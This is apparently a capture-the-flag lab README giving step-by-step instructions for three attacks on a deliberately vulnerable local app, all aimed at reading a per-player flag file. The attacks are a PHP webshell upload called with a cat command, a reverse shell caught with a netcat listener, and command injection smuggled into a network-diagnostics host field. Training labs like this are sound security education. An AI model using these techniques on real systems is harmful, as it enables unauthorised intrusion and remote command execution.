# Lab payloads (Breach Range, Stage 1)

For your own isolated range only. Not copied into the Docker image, you deliver them through
the app's upload vulnerability, which is the point. Your RCE flag file is named after YOUR
player key (shown in the console), so it is unique to you.

## Webshell (shell.php)
1. Enlist in the console, hit **Launch target** (this sets your player key cookie).
2. Open **Upload a profile photo** (`/upload.php`), upload `shell.php` (any extension is accepted).
3. Browse to `http://127.0.0.1:8080/uploads/shell.php?cmd=cat /var/flags/<YOUR_PLAYER_KEY>.flag`.
4. Submit the returned flag in the console.

## Reverse shell (revshell.php)
1. Edit `$ip` / `$port` to your listener on the lab network.
2. `nc -lvnp 4444`, upload `revshell.php`, browse to `/uploads/revshell.php`.
3. In the shell: `cat /var/flags/<YOUR_PLAYER_KEY>.flag`.

## Command injection (no upload needed)
After escalating to admin, the **Network diagnostics** tool (`/netcheck.php`) runs shell commands:
`?host=127.0.0.1; cat /var/flags/<YOUR_PLAYER_KEY>.flag`
